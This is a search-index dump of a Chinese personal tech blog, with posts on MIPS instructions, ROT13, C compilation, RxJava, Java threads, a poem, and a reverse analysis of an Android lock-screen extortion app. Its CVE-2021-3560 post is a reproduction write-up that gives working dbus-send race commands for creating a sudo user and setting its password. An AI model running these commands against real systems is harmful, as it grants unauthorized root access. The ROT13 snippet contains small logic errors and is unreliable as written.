&#x2F; movn: 复制，n为负，z为零。mov $1,$2; movz $1,$2,$3($3为零则复制$2到$1) addi&#x2F;addiu: 把一个寄存器的内容加上一个立即数;u为不带符号加。 rd &#x3D; rs + im sub&#x2F;subu： 把两个定点寄存器的内容相减。 rd &#x3D; rs - rt div&#x2F;divu: 两个定点寄存器的内容相除。 mul&#x2F;mulu: 两个定点寄存器的内容相乘。 slt&#x2F;slti&#x2F;sltui: 如果rs的值小于rt，那么设置rd的值为1,否则设置rd的值为0。 rd &#x3D; (rs &lt; rt) ? 1 : 0 ; rd &#x3D; (rs &lt; im) ? 1 : 0 and&#x2F;andi: 与运算，两个寄存器中的内容相与 ;i为立即数。 rd &#x3D; rs &amp; rt ; rd &#x3D; rs &amp; im or&#x2F;ori: 或运算。 rd &#x3D; rs | rt ; rd &#x3D; rs | im xor&#x2F;xori: 异或运算。 rd &#x3D; rs ^ rt ;rd &#x3D; rs ^ im nor&#x2F;nori: 取反运算。 rd &#x3D; !(rs | rt) j&#x2F;jr&#x2F;jal&#x2F;jalr: j直接跳转 PC &#x3D; { (PC+4) [31,28] , addr, 00}；jr使用寄存器跳转 PC &#x3D; rs； jal $31 &#x3D; PC;PC &#x3D; {(PC+4) [31,28],addr,00} beq&#x2F;beqz&#x2F;benz&#x2F;bne: 条件转移eq相等，z零，ne不等。 beq , PC &#x3D; (rs &#x3D;&#x3D; rt) ? PC+4+im &lt;&lt; 2 : PC ; bne , PC &#x3D; (rs !&#x3D; rt) ? PC+4+im &lt;&lt; 2 : PC lui: 把一个16位的立即数填入到寄存器的高16位，低16位补零。 rt &#x3D; im * 65536(2^16) lw: rt &#x3D; memory[ rs + im] sw: memory[ rs + im] &#x3D; rt sll&#x2F;srl: 逻辑左移&#x2F;右移。 rd &#x3D; rs &lt;&lt; shamt ; rd &#x3D; rs &gt;&gt; shamt","categories":[{"name":"逆向","slug":"逆向","permalink":"http://example.com/categories/%E9%80%86%E5%90%91/"}],"tags":[],"keywords":[{"name":"逆向","slug":"逆向","permalink":"http://example.com/categories/%E9%80%86%E5%90%91/"}]},{"title":"CVE-2021-3560 Polkit权限提升漏洞复现","slug":"技/CVE-2021-3560","date":"2021-08-05T16:00:00.000Z","updated":"2022-07-20T09:57:32.000Z","comments":true,"path":"article/86aaf27b.html","link":"","permalink":"http://example.com/article/86aaf27b.html","excerpt":"","text":"CVE-2021-3560 Polkit权限提升漏洞6月3号，RedHat修复了一个存在七年的权限提升漏洞，该漏洞通过Linux Polkit 来创建新的root用户 Polkit 是linux下的一个系统服务，允许特权进程给非特权进程提供服务 Polkit 则会根据特权进程提供的信息和权限配置文件进行认证 认证完成后将认证结果返回给特权进程 特权进程会根据认证结果来决定是否给非特权进程提供服务 而我们在认证操作中断开连接，导致无法获取认证结果 具体后边会详细分析 由于systemd使用Polkit，所以几乎所有使用systemd的Linux都自带polkit 复现环境：ubuntu20.04 http://releases.ubuntu.com/20.04/ubuntu-20.04.2.0-desktop-amd64.iso ssh（ 在本地ssh下操作） sudo apt install ssh sudo service ssh start ssh &#117;&#115;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x40;&#x31;&#x32;&#55;&#x2e;&#x30;&#x2e;&#48;&#46;&#x31; 具体为什么要用ssh，这里不做赘述，可以自行百度dbus dbus-send发送D-Bus消息的工具，主要用于测试 可以通过dbus-send从命令行触发polkit 通过dbus-send构造语句，来创建一个新用户 dbus-send –system –dest&#x3D;org.freedesktop.Accounts –type&#x3D;method_call –print-reply &#x2F;org&#x2F;freedesktop&#x2F;Accounts org.freedesktop.Accounts.CreateUser string:yunku string:”YunKuSec” int32:1 正常情况返回肯定是认证不通过的 上面说了通过中断来实现认证通过 所以继续构造语句 dbus-send –system –dest&#x3D;org.freedesktop.Accounts –type&#x3D;method_call –print-reply &#x2F;org&#x2F;freedesktop&#x2F;Accounts org.freedesktop.Accounts.CreateUser string:yunku string:”YunKuSec” int32:1 &amp; sleep 0.009s ; kill $! 这里是开始执行后0.009秒断开连接 这里多久断开连接要看具体执行时间，可以在前面加time 测试 我这里大概时间在0.015秒左右，所以我提前在0.009秒断开，具体测试时看执行时间 运气比较好，一次就成了，有个可能运气不太好，需要多试个千八百次的 然后用 id 可以看到语句中构造的yunku 已经存在了，而且在sudo组，具有root权限 现在已经成功利用漏洞创建了用户，但是该用户没有用户名，所以无法登陆 继续构造语句来设置密码 这里涉及到一个知识点，dbus接口设置密码需要通过散列值 通过openssl可以生成散列值(-5是指定 sha256 算法来生成散列值， -6 是 sha512，-1 是 md5) openssl passwd -5 password (这里password是个人需要设置的密码) 构造设置密码语句(User1001 是创建的sudo用户uid 可以通过id 用户名查看， string 后放置密码散列值) dbus-send –system –dest&#x3D;org.freedesktop.Accounts –type&#x3D;method_call –print-reply &#x2F;org&#x2F;freedesktop&#x2F;Accounts&#x2F;User1001 org.freedesktop.Accounts.User.SetPassword string:’$5$P28GOS55linQ0Fe&#x2F;$2dn4a1duWxR9wFIYeO7qfO7ieDZvE25zPh1oxm3&#x2F;Pn6’ string:Whatever &amp; sleep 0.009s ; kill $! 多试这个也需要多试几次 成功之后可以登陆尝试 至此，复现结束！ 原理通过dbus创建新用户时，dbus-send向account-daemon发起请求会先发送到dbus-daemon dbus-daemon会先添加dbus id（这里方便理解 id为 10）到请求中，然后将请求发给account-daemon account-daemon收到请求后向poklit询问id为10的连接有没有权限 poklit向dbus-daemon询问该连接的uid 如果返回的uid为0，就授权，否则打开验证密码窗口让用户输入密码 以上步骤完成后 poklit返回true给account-daemon account-daemon创建新用户 但是！ 如果我们在poklit向dbus-daemon询问该连接的uid时断开，那这个连接就不存在 不存在，就会返回错误 而poklit的错误处理信息不会拒绝该请求，而是将uid视为0，来授权","categories":[{"name":"一些杂七杂八的技术","slug":"一些杂七杂八的技术","permalink":"http://example.com/categories/%E4%B8%80%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E6%8A%80%E6%9C%AF/"}],"tags":[],"keywords":[{"name":"一些杂七杂八的技术","slug":"一些杂七杂八的技术","permalink":"http://example.com/categories/%E4%B8%80%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E6%8A%80%E6%9C%AF/"}]},{"title":"智能合约","slug":"技/智能合约","date":"2021-08-05T16:00:00.000Z","updated":"2022-09-27T09:20:57.000Z","comments":true,"path":"article/c85b8ed3.html","link":"","permalink":"http://example.com/article/c85b8ed3.html","excerpt":"","text":"基于以太坊的solidity智能合约。 在线编辑器环境位置：https://remix.ethereum.org 智能合约文件是以.sol结尾 pragma solidity ^0.4.0; //预编译的作用，^代表版本向上兼容，兼容0.4.x，不能兼容到0.5.0","categories":[{"name":"一些杂七杂八的技术","slug":"一些杂七杂八的技术","permalink":"http://example.com/categories/%E4%B8%80%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E6%8A%80%E6%9C%AF/"}],"tags":[],"keywords":[{"name":"一些杂七杂八的技术","slug":"一些杂七杂八的技术","permalink":"http://example.com/categories/%E4%B8%80%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E6%8A%80%E6%9C%AF/"}]},{"title":"ROT13算法","slug":"技/Rot13","date":"2021-08-04T16:00:00.000Z","updated":"2022-07-20T09:57:32.000Z","comments":true,"path":"article/dd959000.html","link":"","permalink":"http://example.com/article/dd959000.html","excerpt":"","text":"ROT13加密算法凯撒加密的一个变种 单纯的将所有的字符后推13位，超过Z(z)的从A(a)开始换 这就导致他可以用一个算法实现加解密 str = input(&quot;输入要加解密的key：&quot;) flag = &quot;&quot; for i in str: n = ord(i) if (n &gt;= 97 and n &lt; 110) or (n &gt;= 65 and n &lt;= 78) : flag += chr(n+13) elif (n &gt;= 110 and n &lt; 122) or (n &gt;= 78 and n &lt;= 90): flag += chr(n-13) else: flag += i print(flag)","categories":[{"name":"一些杂七杂八的技术","slug":"一些杂七杂八的技术","permalink":"http://example.com/categories/%E4%B8%80%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E6%8A%80%E6%9C%AF/"}],"tags":[],"keywords":[{"name":"一些杂七杂八的技术","slug":"一些杂七杂八的技术","permalink":"http://example.com/categories/%E4%B8%80%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E6%8A%80%E6%9C%AF/"}]},{"title":"一个c语言代码变为c语言程序的全过程","slug":"逆/cAnd0101","date":"2021-08-01T16:00:00.000Z","updated":"2022-07-20T09:57:32.000Z","comments":true,"path":"article/5aedeb05.html","link":"","permalink":"http://example.com/article/5aedeb05.html","excerpt":"","text":"#include &lt;stdio.h&gt; int main(int argc, char const *argv[]) &#123; printf(&quot;hello world\\n&quot;); return 0; &#125; 这样一段代码通过编译器进行如下操作后来得到可执行文件 下面详细说明下每个步骤 预处理根据#开头的命令，将头文件命令行代码插入代码 可以用gcc -E hello.c -o hello.i 来只完成预处理 打开hello.i 可以发现代码前边多处500多行代码 这个可以在本机目录下找到stdio.h这个文件 这就是预处理的整个过程 编译将hello.i编译成汇编语言，这个过程之后程序会更接近机器语言 这里解释下什么是机器语言，什么是高级语言 我们定义 00100 1 0的含义为1 + 0 即 00100 为加号 1 为被加数 0 为加数 这样写偏向于底层，在程序员看来是非常不直接的，不方便的。（这种二进制代码也被称为硬编码） 那我们再次规定，我们用add 1 0 来表示1 + 0，这样子容易理解多了， （类似于早期这种比较简单语言称为汇编语言，这样的代码需要巨大的代码量来完成一些简单的逻辑） 人们使用汇编语言将常用的一些逻辑二次封装成为比较人性化的代码 再把 add 1 0 二次封装，为 1 + 0 这样，就很方便使用和理解 （这种代码就被称为高级语言，这种语言更符合人类的使用习惯） 上面这串代码从下往上的过程，就被称为代码的编译，处理它们的软件被称为编译器 使用 gcc -S hello.i -o hello.s可以将预处理后的文件编译为汇编语言的文件 汇编将hello.s 打包成可重定位目标程序 hello.o 这一步已经将机器语言变成了二进制文件，用文本文件打开后会看到乱码 但仍然可以用二进制文本编辑器查看 链接我们上边说过，早期人们将一些常用的逻辑打包， 一些常用逻辑包放在在标准库，使大家不需要每个函数都存放在代码里 就比如我们使用的printf 函数在标准库中的printf.o文件 在链接时，将hello.o 和printf.o两个文件打包成可执行文件 使用 gcc hello.o -o hello 就可以链接需要的文件得到可执行文件","categories":[{"name":"逆向","slug":"逆向","permalink":"http://example.com/categories/%E9%80%86%E5%90%91/"}],"tags":[],"keywords":[{"name":"逆向","slug":"逆向","permalink":"http://example.com/categories/%E9%80%86%E5%90%91/"}]},{"title":"Rxjava学习笔记","slug":"技/Rxjava","date":"2021-07-11T16:00:00.000Z","updated":"2022-07-20T09:57:32.000Z","comments":true,"path":"article/f44be05a.html","link":"","permalink":"http://example.com/article/f44be05a.html","excerpt":"","text":"RxJava是基于事件流，进行异步操作的库，类似于android中的AsyncTask，Handler的作用 特点在于逻辑简洁实现优雅使用简单。 Rxjava的逻辑流程顾客到饭店吃饭，找服务员点菜，服务员到厨房下单，后厨根据顺序烹调出对应的菜式，然后按顺序一一送给顾客 在整个逻辑中有四个角色 顾客：被观察者（observable） 厨房：观察者（Observer） 服务员：订阅（SubScribe） 菜式：事件（Event） 被观察者产生事件，观察者接收事件并且给出响应动作 订阅连接观察者和被观察者 事件是被观察者 &amp; 观察者 沟通的载体 实现步骤引入依赖 implementation &quot;io.reactivex.rxjava3:rxjava:3.x.y&quot; （这里xy指的是版本号，尽量去github自己看，我这里用的是3.0.13） 创建方式，还是一般创建方式 我这里使用的是rxjava3，直接写在了mainactivity中 //正常创建形式 //创建被观察者 Observable.create(new ObservableOnSubscribe&lt;String&gt;() &#123; @Override public void subscribe(@NonNull ObservableEmitter&lt;String&gt; emitter) throws Throwable &#123; try &#123; //在这里传递参数 emitter.onNext(&quot;这是第一个参数&quot;); emitter.onComplete(); &#125;catch (Exception e)&#123; //在这里传递异常 emitter.onError(e); &#125; &#125; //这里相当于直接创建观察者并订阅 &#125;).subscribe(new Observer&lt;String&gt;() &#123; @Override public void onSubscribe(@NonNull Disposable d) &#123; Log.d(TAG,&quot;调用subscribe&quot;); &#125; @Override public void onNext(@NonNull String s) &#123; Log.d(TAG,s); &#125; @Override public void onError(@NonNull Throwable e) &#123; Log.d(TAG,&quot;错误被调用&quot;); &#125; @Override public void onComplete() &#123; Log.d(TAG,&quot;onComplete被调用&quot;); &#125; &#125;); //just方法直接传递数据 Observable.just(&quot;测试参数&quot;).subscribe(new Observer&lt;String&gt;() &#123; @Override public void onSubscribe(@NonNull Disposable d) &#123; Log.d(TAG,&quot;调用subscribe&quot;); &#125; @Override public void onNext(@NonNull String s) &#123; Log.d(TAG,s); &#125; @Override public void onError(@NonNull Throwable e) &#123; Log.d(TAG,&quot;错误被调用&quot;); &#125; @Override public void onComplete() &#123; Log.d(TAG,&quot;onComplete被调用&quot;); &#125; &#125;); rxjava可以传递数组 不过rxjava3抛弃了from改用了具体的from类型 int[] intArray = &#123;1,2,3,4&#125;; Observable.fromArray(intArray).subscribe(new Observer&lt;int[]&gt;() &#123; @Override public void onSubscribe(@NonNull Disposable d) &#123; &#125; @Override public void onNext(int @NonNull [] ints) &#123; for(int a : ints)&#123; Log.d(TAG, a+&quot;&quot;); &#125; &#125; @Override public void onError(@NonNull Throwable e) &#123; &#125; @Override public void onComplete() &#123; &#125; &#125;); 这里具体使用见文档，不多做赘述","categories":[{"name":"一些杂七杂八的技术","slug":"一些杂七杂八的技术","permalink":"http://example.com/categories/%E4%B8%80%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E6%8A%80%E6%9C%AF/"}],"tags":[],"keywords":[{"name":"一些杂七杂八的技术","slug":"一些杂七杂八的技术","permalink":"http://example.com/categories/%E4%B8%80%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E6%8A%80%E6%9C%AF/"}]},{"title":"老去的尼尼卡 --英雄的迟暮","slug":"诗/TheOldninika","date":"2021-06-02T16:00:00.000Z","updated":"2022-07-20T09:57:32.000Z","comments":true,"path":"article/f8245e93.html","link":"","permalink":"http://example.com/article/f8245e93.html","excerpt":"","text":"老去的尼尼卡我们的尼尼卡老去了， 他伟岸的肩膀不再挺拔…… 这位满头白发的老人 真的曾经拥有钢铁一般的力量？ 啊，母亲啊！ 到底有多少次他挥舞着“土狼”镰刀， 袒胸露背， 在麦田的尽头突然大声地咆哮。 他肯定搬移过大山 把它们并排而列， 他那滴汗的脸上 喷射着火焰和浓烟。 可他现在连膝盖都动不了， 岁月割去了它们。 他只能躺下， 或者做梦， 或者告诉他子孙的子孙 他曾经的过往。 他偶尔会听见 附近麦田传来的歌声， 他那曾经坚硬的心开始愉悦地跳动。 他颤抖地走出了门。 他拄着拐杖往前走了几步。 当他看到年轻的小伙， 他安慰地笑了起来。 ——索塞罗","categories":[{"name":"诗","slug":"诗","permalink":"http://example.com/categories/%E8%AF%97/"}],"tags":[],"keywords":[{"name":"诗","slug":"诗","permalink":"http://example.com/categories/%E8%AF%97/"}]},{"title":"一个安卓锁机软件的逆向分析","slug":"逆/reRootLock","date":"2021-05-27T16:00:00.000Z","updated":"2022-07-20T09:57:32.000Z","comments":true,"path":"article/e48e684a.html","link":"","permalink":"http://example.com/article/e48e684a.html","excerpt":"","text":"前两天在吾爱上看到有人求助手机被锁，顺手吧样本下载了，分析下。 样本桌面是一个百度网盘的图标 这像素一看就是假的。。。 打开后是个root锁机，这里还是提醒各位没事不要随便开root权限，这都2021年了，还有这种垃圾软件，也是服了！ 直接jeb 启动后看到这变量名是真恶心啊！！！ 发现MainActivity中只调用了一个hh 第一个页面这里发现第一个页面是第四层函数 这里主要是q()中是个文字编码，提取出来，把这两行解密下。 这里有一行解码后发现是一个网站，猜测可能是访问网站返回解码 100000005线程处跟进 本质是做了一个判断，继续跟进isINTERET() 这里发现9160，尝试下，对了 然后进入第二个页面 （还是多重锁机骗钱，可以很骚，很傻逼） 第二个页面 第二层是第五层的函数 跟进100000008 点击屏幕30次会出现两个控件 然后跟进100000009 这里try里边先做了一个字符编码，直接把m这个函数摘下来稍作修改 解码后是9，5，10 然后通过这三个数做了运算 同样吧加密摘下来 这个加密处理处v0.val$test 是界面给的序列号 这个序列号是通过取随机数然后通过m下的方法处理后的（这个软件变量方法名太恶心了，就在第五层的倒数第三行） 还是老办法，把这个函数取出来处理下 把v1，v2 的值交换下就可以了 转第二层锁 第三个页面 这个和上一个差不多做法就不细说了 把改过的函数挂出来吧（这里边函数或者变量名是修改过的，后边会把整个项目脚本放上来，可以看那个） 解出来后跳到第四个页面 第四个页面第三层函数 和上边也是差不多 继续改函数 这里要注意 粉红兔 这个实例在创建的时候传了个 fuck参数（当时找了好久，好烦呀） 搞定，下一层下一层 第五个页面第一层函数，看起来也差不多 看第四个页面，不过这里又个迷惑人的点 随机码多了一个b，解码时删掉这个解就好 总结没有什么特别奇怪的算法，都是大差不差，刚去看了下吾爱，好像有师傅提前解出来了 网站也是被挺多人留言了 分析的时候去找过那个qq群，好像还在运行，这种人就挺可恶的 拿技术做坏事，为人所不齿 脚本因为是分析的时候写的，乱得很，这里先放上来 https://gitee.com/p1piyang/backward-analysis/tree/master 累死了！！！","categories":[{"name":"逆向","slug":"逆向","permalink":"http://example.com/categories/%E9%80%86%E5%90%91/"}],"tags":[],"keywords":[{"name":"逆向","slug":"逆向","permalink":"http://example.com/categories/%E9%80%86%E5%90%91/"}]},{"title":"java多线程","slug":"技/javaMultithreading","date":"2020-06-25T16:00:00.000Z","updated":"2022-07-20T09:57:32.000Z","comments":true,"path":"article/11bde6ec.html","link":"","permalink":"http://example.com/article/11bde6ec.html","excerpt":"","text":"(因为是迁移过来的，好多图片都丢失了，建议自己复制代码运行看一下) 串行与并发 串行 当有多个任务需要执行时，是按照从前往后的顺序去执行的顺序就叫串行。类比的话就是一条单行道上的车辆肯定是前后顺序，不可能同时通行多辆车。 并发是让多个任务同时执行。一条马路上的两条单行车道上两辆车同时执行，这两辆车就是并发的状态。 程序的运行状态一般是串行与并发同步进行的。 进程进程是对一个程序运行是各种资源的描述（cpu，内存等），进程实现多个任务并发运行。进程资源不共享。 线程线程是进程的最小单元。如果把进程看成一座工厂，进程就是进程中的流水线。一个进程中有多个线程，且一个进程中有多个线程。线程资源共享（临界资源）。 并发是怎么做到的计算机给某个进程（或线程）分配固定的cpu时间，让cpu快速的在不同进程（或线程）中快速切换，来造成同时运行的假象。cpu的运行速度是非常快的，人反应不过来，这才导致的并发假象。 （是假象） 线程的生命周期从被实例化完成到被销毁。线程的状态: 新生态 New ：一个线程被实例化完成，没有做任何操作。 就绪态 Ready：一个线程已经被开启，已经开始争抢cpu时间片（某段时间去运行这个线程）。 运行态 Run： 一个线程抢到了cpu时间片，已经开始执行现成的逻辑。 阻塞态 Interrupt：正在运行的过程中受到某些操作的影响，放弃了已经获取到的cpu时间片，并且不再参与cpu时间片的争抢，处于挂起状态。（scanf sleep join等） 死亡态 Dead：一个线程对象被销毁。 创建实例化线程 继承Thread类，自定义线程类 package com.p1.theard; public class ThreadCreate1 &#123; public static void main(String[] args) &#123; //实例化子线程 MyThread myThread = new MyThread(); //通过start方法开启线程，如果直接调用run方法他会把线程当作普通类来运行 myThread.start(); //在线程之后打印句话来感受下线程 System.out.println(&quot;主线程逻辑&quot;); &#125; &#125; //继承Thread并重写run方法 class MyThread extends Thread&#123; @Override public void run() &#123; for (int i=0; i&lt;10; i++)&#123; System.out.println(&quot;子线程逻辑&quot;+i); &#125; &#125; &#125; 执行后会发现先执行的主线程逻辑这句话，然后才是子线程逻辑。 通过Runnable接口 package com.p1.theard; public class ThreadCreate2 &#123; public static void main(String[] args) &#123; Runnable r = new Runnable() &#123; @Override public void run() &#123; for (int i = 0; i &lt; 9; i++) &#123; System.out.println(&quot;子线程逻辑1:&quot;+i); &#125; &#125; &#125;; //lambda表达式 Runnable r1 = () -&gt; &#123; for (int i = 0; i &lt; 9; i++) &#123; System.out.println(&quot;子线程逻辑2:&quot;+i); &#125; &#125;; //通过有参来实例化线程 Thread t1 = new Thread(r); Thread t2 = new Thread(r1); //启动 t1.start(); System.out.println(&quot;主线程逻辑1&quot;); t2.start(); System.out.println(&quot;主线程逻辑2&quot;); &#125; &#125; 通过多次运行能发现他们每次运行的每个线程运行时间都是不一样的，更好的感受下争抢cpu时间片这个概念。 线程的命名 实例化对象同时通过构造方法命名 package com.p1.theard; public class Thread_name &#123; public static void main(String[] args) &#123; Thread t1 = new Thread(&quot;custom1&quot;); System.out.println(t1.getName()); &#125; &#125; Runnable接口创建同时命名 package com.p1.theard; public class Thread_name &#123; public static void main(String[] args) &#123; Thread t1 = new Thread(() -&gt; &#123;&#125;,&quot;custom2&quot;); System.out.println(t1.getName()); &#125; &#125; 自定义线程类,实例化同时进行名称赋值 package com.p1.theard; public class Thread_name &#123; public static void main(String[] args) &#123; MyThread2 myThread2 = new MyThread2(&quot;custom3&quot;); System.out.println(myThread2.getName()); &#125; &#125; class MyThread2 extends Thread&#123; public MyThread2(String name)&#123; this.setName(name); &#125; &#125; 线程的休眠Thread.sleep() 以毫秒为单位 package com.p1.theard; public class Thread_sleep &#123; public static void main(String[] args) &#123; MyThread3 myThread3 = new MyThread3(); myThread3.start(); &#125; &#125; class MyThread3 extends Thread&#123; @Override public void run() &#123; for (int i = 0; i &lt; 10; i++) &#123; System.out.println(i); try &#123; Thread.sleep(1000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125; &#125; 线程的优先级设置线程的优先级只是去修改这个线程抢到cpu时间片的概率。不代表优先级高的一定能抢到cpu时间片。优先级的设置是一个(0,10]的整数，默认是5。设置优先级必须要放到start之前。 package com.p1.theard; public class Thread_first &#123; public static void main(String[] args) &#123; Runnable r1 = () -&gt; &#123; for (int i = 0; i &lt; 100; i++) &#123; System.out.println(Thread.currentThread().getName()+&quot;&quot;+i); &#125; &#125;; Thread t1 = new Thread(r1,&quot;Thread-1:&quot;); Thread t2 = new Thread(r1,&quot;Thread-2:&quot;); t1.setPriority(1); t2.setPriority(10); t1.start(); t2.start(); &#125; &#125; 线程的礼让让当前运行状态的线程释放自己的cpu资源，由运行状态回到就绪状态，然后重新抢cpu时间片。 package com.p1.theard; public class Thread_yield &#123; public static void main(String[] args) &#123; Runnable r1 = () -&gt;&#123; for (int i = 0; i &lt; 10; i++) &#123; System.out.println(Thread.currentThread().getName()+&quot;&quot;+i); if (i == 3)&#123; Thread.yield(); &#125; &#125; &#125;; Thread t1 = new Thread(r1,&quot;thread-1:&quot;); Thread t2 = new Thread(r1,&quot;thread-2:&quot;); t1.start(); t2.start(); &#125; &#125; 线程的临界资源问题线程中资源共享例如一个景点的四个售票员，他们卖的票都是从一个票库里拿出来的，这个票库里的票就叫临界资源。 package com.p1.theard; public class ScorceFilct &#123; public static void main(String[] args) &#123; //实例化四个线程来模拟四个售票员 Runnable r = () -&gt; &#123; while (TicketClent.restCount &gt; 0)&#123; System.out.println(Thread.currentThread().getName()+&quot;卖出1张票，剩余&quot;+ --TicketClent.restCount); &#125; &#125;; Thread t1 = new Thread(r,&quot;thread-1&quot;); Thread t2 = new Thread(r,&quot;thread-2&quot;); Thread t3 = new Thread(r,&quot;thread-3&quot;); Thread t4 = new Thread(r,&quot;thread-4&quot;); t1.start(); t2.start(); t3.start(); t4.start(); &#125; &#125; //票库 class TicketClent&#123; //票库中的100张票 public static int restCount = 100; &#125; 按照正常逻辑，最后一条输出应该是Jon卖出1张票，剩余0，但事实并不是这样。 System.out.println(Thread.currentThread().getName()+&quot;卖出1张票，剩余&quot;+ --TicketClent.restCount); 这行代码的运行是先去将TicketClent类中的restCount变量减1 先是由thread-1抢到了cpu时间片，thread-1刚去将restCount减一，还没来得及打印或者刚刚打印，就被thread-2抢走了cpu时间片（剩余99张） thread-2刚执行完减一操作，没有来得及打印又被thread-4抢去了cpu时间片（剩余98张）（第97张在比较靠下） thread-4也是减一完之后没有来得及打印，被thread-3抢去cpu时间片（剩余97张） thread-3减一之后没有打印就被thread-1抢去cpu时间片（剩余96） thread-1得到cpu时间片之后完成了减一打印一系列操作，进行了两次循环之后被thread-2抢去了cpu时间片 thread-2得到cpu时间片之后先把没有来得及打印的东西打印出来，然后正常执行减一打印操作，一路高歌猛进。 以此类推就能明白整个逻辑（ps：thread-3，thread-4真水，前边就个抢到一次） 解决临界资源问题（线程锁）临界资源问题的本质是多个线程同时访问同一个资源解决方法：在某个线程访问临界资源时，在资源外边加一把锁，其他资源发现锁之后就等待，等到解锁之后再去操作资源。 线程锁： 多个同时访问临界资源的线程看到的锁需要时同一把锁 同步代码段（synchroized）package com.p1.theard; public class ScorceFilct &#123; public static void main(String[] args) &#123; //实例化四个线程来模拟四个售票员 Runnable r = () -&gt; &#123; while (TicketClent.restCount &gt; 0)&#123; //对象锁，在括号中写对象 //类锁： 在括号中写类 synchronized (&quot;&quot;)&#123; System.out.println(Thread.currentThread().getName() + &quot;卖出1张票，剩余&quot; + --TicketClent.restCount); &#125; &#125; &#125;; Thread t1 = new Thread(r,&quot;thread-1&quot;); Thread t2 = new Thread(r,&quot;thread-2&quot;); Thread t3 = new Thread(r,&quot;thread-3&quot;); Thread t4 = new Thread(r,&quot;thread-4&quot;); t1.start(); t2.start(); t3.start(); t4.start(); &#125; &#125; //票库 class TicketClent&#123; //票库中的100张票 public static int restCount = 100; &#125; 运行之后我们会发现出现负数原因是当restCount为1时，其他while循环成立，线程进去之后发现锁，就会在while里边锁外边等待正在执行的线程结束释放资源解锁，解锁之后刚运行完的线程发现不满足循环条件就不会再去争抢，而在循环里边的线程不回去管restCount的值继续去执行。 解决方法：在锁中加一个判断，判断restCount是否大于0再去执行打印即可 package com.p1.theard; public class ScorceFilct &#123; public static void main(String[] args) &#123; //实例化四个线程来模拟四个售票员 Runnable r = () -&gt; &#123; while (TicketClent.restCount &gt; 0)&#123; synchronized (&quot;&quot;)&#123; if (TicketClent.restCount&gt;0) &#123; System.out.println(Thread.currentThread().getName() + &quot;卖出1张票，剩余&quot; + --TicketClent.restCount); &#125; &#125; &#125; &#125;; Thread t1 = new Thread(r,&quot;thread-1&quot;); Thread t2 = new Thread(r,&quot;thread-2&quot;); Thread t3 = new Thread(r,&quot;thread-3&quot;); Thread t4 = new Thread(r,&quot;thread-4&quot;); t1.start(); t2.start(); t3.start(); t4.start(); &#125; &#125; //票库 class TicketClent&#123; //票库中的100张票 public static int restCount = 100; &#125; 同步方法 （使用关键字synchronized修饰的方法）静态方法：同步锁就是类锁 当前类.class非静态方法：this 将买票（执行逻辑）放到一个单独的方法里边，并且用synchronized修饰 package com.p1.theard; public class ScorceFilct &#123; public static void main(String[] args) &#123; //实例化四个线程来模拟四个售票员 Runnable r = () -&gt; &#123; while (TicketClent.restCount &gt; 0)&#123; soidCket(); &#125; &#125;; Thread t1 = new Thread(r,&quot;thread-1&quot;); Thread t2 = new Thread(r,&quot;thread-2&quot;); Thread t3 = new Thread(r,&quot;thread-3&quot;); Thread t4 = new Thread(r,&quot;thread-4&quot;); t1.start(); t2.start(); t3.start(); t4.start(); &#125; public synchronized static void soidCket()&#123; if (TicketClent.restCount&gt;0) &#123; System.out.println(Thread.currentThread().getName() + &quot;卖出1张票，剩余&quot; + --TicketClent.restCount); &#125; &#125; &#125; //票库 class TicketClent&#123; //票库中的100张票 public static int restCount = 100; &#125; 显式（ReentrcntLock）创建ReentecntLock对象 在代码段前后用lock（）方法（代码段前）unlock（）方法（代码段后） 死锁多个线程彼此持有对方需要的锁，而不去释放自己的锁 package com.p1.theard; public class DeadLock &#123; public static void main(String[] args) &#123; Runnable r1 = () -&gt;&#123; synchronized (&quot;A&quot;)&#123; System.out.println(&quot;r1线程持有a锁，等待b锁&quot;); synchronized (&quot;B&quot;)&#123; System.out.println(&quot;r1线程同时持有a，b锁&quot;); &#125; &#125; &#125;; Runnable r2 = () -&gt;&#123; synchronized (&quot;B&quot;)&#123; System.out.println(&quot;r2线程持有b锁，等待a锁&quot;); synchronized (&quot;A&quot;)&#123; System.out.println(&quot;r2线程同时持有a，b锁&quot;); &#125; &#125; &#125;; Thread t1 = new Thread(r1); Thread t2 = new Thread(r2); t1.start(); t2.start(); &#125; &#125; 没有任何一个线程能去同时持有a锁和b锁并且程序没有结束，线程都在等待对方解锁我们在程序中尽量要去避免死锁 解死锁wait：等待，Object类中的一个方法，让当前的线程，并且让出cpu资源，并且让线程进入等待队列。 notify： 通知，Object类中的一个方法，唤醒等待队列中的一个线程，使这个线程进入锁池。 notifyAll：通知，Object类中的一个方法，唤醒等待队列的所有线程，使所以线程进入锁池。 package com.p1.theard; public class DeadLock &#123; public static void main(String[] args) &#123; Runnable r1 = () -&gt;&#123; synchronized (&quot;A&quot;)&#123; System.out.println(&quot;r1线程持有a锁，等待b锁&quot;); try &#123; //r1释放掉A线程，并且r1进入等待队列，等待唤醒 &quot;A&quot;.wait(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; synchronized (&quot;B&quot;)&#123; System.out.println(&quot;r1线程同时持有a，b锁&quot;); &#125; &#125; &#125;; Runnable r2 = () -&gt;&#123; synchronized (&quot;B&quot;)&#123; System.out.println(&quot;r2线程持有b锁，等待a锁&quot;); synchronized (&quot;A&quot;)&#123; System.out.println(&quot;r2线程同时持有a，b锁 &quot;); &#125; &#125; &#125;; Thread t1 = new Thread(r1); Thread t2 = new Thread(r2); t1.start(); t2.start(); &#125; &#125; 